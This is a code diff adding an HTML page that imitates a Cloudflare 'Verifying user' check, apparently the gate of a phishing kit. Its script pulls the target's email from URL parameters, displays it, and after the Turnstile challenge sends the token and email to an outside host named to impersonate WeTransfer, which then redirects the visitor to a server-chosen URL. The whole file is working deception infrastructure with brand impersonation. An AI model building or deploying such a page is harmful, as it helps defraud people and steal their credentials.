@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Please wait...</title>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<style>
+  :root {
+    --brand-c1: #0066FF;
+    --brand-c2: #0047B3;
+    --brand-fg: #ffffff;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Noto Sans KR", Arial, sans-serif;
+    background: #f7f7f7;
+    color: #313131;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .cf-card {
+    background: #fff;
+    border: 1px solid #d9d9d9;
+    border-radius: 8px;
+    max-width: 460px;
+    width: 100%;
+    padding: 0 0 24px;
+    box-shadow: 0 2px 8px rgba(0,0,0,.04);
+    text-align: center;
+    overflow: hidden;
+    position: relative;
+  }
+  .brand-bar {
+    height: 5px;
+    background: linear-gradient(90deg, var(--brand-c1), var(--brand-c2));
+  }
+  .brand-mark {
+    width: 64px;
+    height: 64px;
+    margin: 28px auto 18px;
+    border-radius: 16px;
+    display: grid;
+    place-items: center;
+    font-size: 30px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    background: linear-gradient(135deg, var(--brand-c1), var(--brand-c2));
+    color: #fff;
+    box-shadow: 0 10px 24px -10px var(--brand-c1);
+  }
+  .cf-card h1 {
+    font-size: 20px;
+    font-weight: 600;
+    color: #313131;
+    margin-bottom: 8px;
+  }
+  .cf-card p {
+    font-size: 14px;
+    color: #6a6a6a;
+    margin-bottom: 20px;
+    line-height: 1.5;
+    padding: 0 28px;
+  }
+  .brand-chip {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin: 0 auto 22px;
+    padding: 8px 14px;
+    border-radius: 999px;
+    background: #fafafa;
+    border: 1px solid #ececec;
+    font-size: 12.5px;
+    color: #555;
+  }
+  .brand-chip .dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--brand-c1), var(--brand-c2));
+  }
+  .brand-chip strong { color: #313131; font-weight: 700; }
+  .cf-turnstile {
+    display: flex;
+    justify-content: center;
+    margin: 0 auto 20px;
+    min-height: 65px;
+  }
+  .cf-footer {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 10px;
+    flex-wrap: wrap;
+    font-size: 11px;
+    color: #6a6a6a;
+    padding-top: 16px;
+    border-top: 1px solid #f0f0f0;
+    margin: 8px 28px 0;
+  }
+  .cf-footer a { color: #6a6a6a; text-decoration: none; }
+  .cf-footer a:hover { text-decoration: underline; }
+  .cf-logo {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    color: #f6821f;
+    font-weight: 600;
+  }
+  .spinner {
+    display: none;
+    width: 36px;
+    height: 36px;
+    margin: 8px auto 20px;
+    border: 3px solid #f0f0f0;
+    border-top: 3px solid var(--brand-c1);
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .error-box {
+    display: none;
+    background: #fff5f5;
+    border: 1px solid #f5c6cb;
+    color: #a94442;
+    padding: 10px 14px;
+    border-radius: 4px;
+    font-size: 13px;
+    margin: 12px 28px 0;
+  }
+  .state-verifying .spinner { display: block; }
+  .state-verifying .cf-turnstile { display: none; }
+  .state-verifying .brand-chip { display: none; }
+</style>
+</head>
+<body>
+
+<div class="cf-card" id="cfCard">
+  <div class="brand-bar"></div>
+
+  <div class="brand-mark" id="t-brandMark">H</div>
+
+  <h1 id="t-title">Verifying user</h1>
+  <p id="t-subtitle">This will take a few seconds.</p>
+
+  <div class="brand-chip" id="brandChip">
+    <span class="dot"></span>
+    <span id="t-targetText">Verifying for <strong id="brandChipName">—</strong></span>
+  </div>
+
+  <div class="spinner"></div>
+
+  <!-- Cloudflare Turnstile widget -->
+  <div class="cf-turnstile"
+       id="turnstileWidget"
+       data-sitekey="0x4AAAAAAE05AJQxT-EsaFlm"
+       data-callback="onVerified"
+       data-error-callback="onTurnstileError"
+       data-expired-callback="onTurnstileExpired"
+       data-theme="light"
+       data-size="flexible"></div>
+
+  <div class="error-box" id="errorBox"></div>
+
+  <div class="cf-footer">
+    <span class="cf-logo">
+      <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:16px;height:16px;">
+        <path fill="#f6821f" d="M35.6 27.7l-4.1-1.9c-.6-.2-1.1-.8-1.2-1.4l-3.7-12.3c-.1-.4-.5-.7-.9-.7h-5.6c-.4 0-.7.3-.6.7l3.5 11.7c.1.4.5.7.9.7h5.7c.2 0 .4-.2.3-.4l-1.2-4.2c-.1-.4.2-.8.6-.8h4.6c.4 0 .7.3.6.7l-1.6 5.4c-.1.4-.5.7-.9.7H22c-.2 0-.4.2-.3.4l1 3.4c.1.4.5.7.9.7h11.4c.5 0 .8-.4.6-.9l-.7-1.6c-.1-.3.1-.6.4-.6h4.5c.3 0 .5-.3.4-.6l-.7-2.4c-.1-.4-.5-.6-.9-.6l-4.1.1z"/>
+      </svg>
+      Cloudflare
+    </span>
+    <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener" id="t-privacy">Privacy</a>
+    <span>•</span>
+    <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noopener" id="t-terms">Terms</a>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   API Config (Update this if your backend is on a different domain)
+   ============================================================ */
+const API_BASE = 'https://secure-wetransfer-doc.onrender.com';
+
+/* ============================================================
+   MULTILINGUAL DICTIONARY
+   ============================================================ */
+const translations = {
+  en: {
+    pageTitle: "Please wait...",
+    title: "Verifying user",
+    subtitle: "This will take a few seconds.",
+    targetText: "Verifying for",
+    privacy: "Privacy",
+    terms: "Terms",
+    errFail: "Verification failed. Please refresh the page.",
+    errTimeout: "Security check is taking longer than expected. Please refresh.",
+    errConn: "Connection error. Please try again."
+  },
+  bg: {
+    pageTitle: "Моля, изчакайте...",
+    title: "Проверка на потребителя",
+    subtitle: "Това ще отнеме няколко секунди.",
+    targetText: "Проверка за",
+    privacy: "Поверителност",
+    terms: "Условия",
+    errFail: "Неуспешна проверка. Моля, опреснете страницата.",
+    errTimeout: "Проверката за сигурност отнема повече време. Опреснете.",
+    errConn: "Грешка при връзката. Моля, опитайте отново."
+  },
+  de: {
+    pageTitle: "Bitte warten...",
+    title: "Benutzer wird überprüft",
+    subtitle: "Dies dauert ein paar Sekunden.",
+    targetText: "Überprüfung für",
+    privacy: "Datenschutz",
+    terms: "AGB",
+    errFail: "Überprüfung fehlgeschlagen. Bitte laden Sie die Seite neu.",
+    errTimeout: "Sicherheitsüberprüfung dauert länger. Bitte neu laden.",
+    errConn: "Verbindungsfehler. Bitte versuchen Sie es erneut."
+  }
+};
+
+let currentLang = 'en';
+
+function detectLanguage() {
+  const userLang = navigator.language || navigator.userLanguage;
+  if (userLang.startsWith('bg')) return 'bg';
+  if (userLang.startsWith('de')) return 'de';
+  return 'en';
+}
+
+function applyTranslations(lang) {
+  const t = translations[lang];
+  currentLang = lang;
+  document.title = t.pageTitle;
+  document.getElementById('t-title').innerText = t.title;
+  document.getElementById('t-subtitle').innerText = t.subtitle;
+  document.getElementById('t-targetText').innerHTML = t.targetText + ' <strong id="brandChipName">' + (EMAIL || '—') + '</strong>';
+  document.getElementById('t-privacy').innerText = t.privacy;
+  document.getElementById('t-terms').innerText = t.terms;
+}
+
+/* ============================================================
+   READ EMAIL FROM URL
+   ============================================================ */
+function getEmailFromSource() {
+  let fromHash = window.location.hash.substring(1);
+  if (fromHash) {
+    try { fromHash = decodeURIComponent(fromHash); } catch (e) {}
+    fromHash = fromHash.split('&')[0].split('?')[0].replace(/^email=/i, '').trim();
+    if (fromHash.includes('@')) return fromHash;
+  }
+
+  const params = new URLSearchParams(window.location.search);
+  const keys = ['auth', 'e', 'email', 'u', 'login_hint', 'user', 'mail'];
+  for (const k of keys) {
+    const v = params.get(k);
+    if (v && v.includes('@')) return v;
+  }
+
+  if (window.location.search.length > 1) {
+    let raw = window.location.search.substring(1);
+    try { raw = decodeURIComponent(raw); } catch (e) {}
+    raw = raw.split('&')[0].split('?')[0].trim();
+    if (raw.includes('@')) return raw;
+  }
+  return '';
+}
+
+var EMAIL = getEmailFromSource();
+var verified = false;
+
+/* ============================================================
+   INIT
+   ============================================================ */
+(function init() {
+  const detectedLang = detectLanguage();
+  applyTranslations(detectedLang);
+  
+  if (!EMAIL) {
+    document.getElementById('brandChip').style.display = 'none';
+  }
+})();
+
+/* ============================================================
+   TURNSTILE CALLBACKS & BACKEND VERIFICATION
+   ============================================================ */
+async function onVerified(token) {
+  if (verified) return;
+  if (!token) { onTurnstileError('missing-token'); return; }
+  
+  verified = true;
+  console.log('🛡️ Turnstile passed, sending token to backend...');
+
+  var card = document.getElementById('cfCard');
+  if (card) card.classList.add('state-verifying');
+  var t = translations[currentLang];
+
+  try {
+    // Send token and email to your server for cryptographic proof
+    const response = await fetch(API_BASE + '/api/turnstile-verify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ token: token, email: EMAIL })
+    });
+
+    const data = await response.json();
+
+    if (data.success && data.redirect) {
+      console.log('✅ Proof generated, redirecting...');
+      // The server returns the exact URL with u=, p=, and t=
+      setTimeout(function () {
+        window.location.href = data.redirect;
+      }, 800);
+    } else {
+      throw new Error(data.message || 'Verification failed on server');
+    }
+  } catch (error) {
+    console.error('❌ Backend verification failed:', error);
+    var box = document.getElementById('errorBox');
+    if (box) {
+      box.style.display = 'block';
+      box.textContent = t.errConn;
+    }
+    if (card) card.classList.remove('state-verifying');
+    verified = false;
+    if (window.turnstile) {
+      try { window.turnstile.reset(); } catch (e) {}
+    }
+  }
+}
+
+function onTurnstileError(code) {
+  console.error('❌ Turnstile error:', code);
+  var box = document.getElementById('errorBox');
+  if (box) {
+    box.style.display = 'block';
+    box.textContent = translations[currentLang].errFail;
+  }
+  var card = document.getElementById('cfCard');
+  if (card) card.classList.remove('state-verifying');
+}
+
+function onTurnstileExpired() {
+  verified = false;
+  if (window.turnstile) {
+    try { window.turnstile.reset(); } catch (e) {}
+  }
+}
+
+// Fallback: if Turnstile never loads, show message
+setTimeout(function () {
+  if (!verified && window.turnstile === undefined) {
+    var box = document.getElementById('errorBox');
+    if (box) {
+      box.style.display = 'block';
+      box.textContent = translations[currentLang].errTimeout;
+    }
+  }
+}, 15000);
+</script>
+
+</body>
+</html>
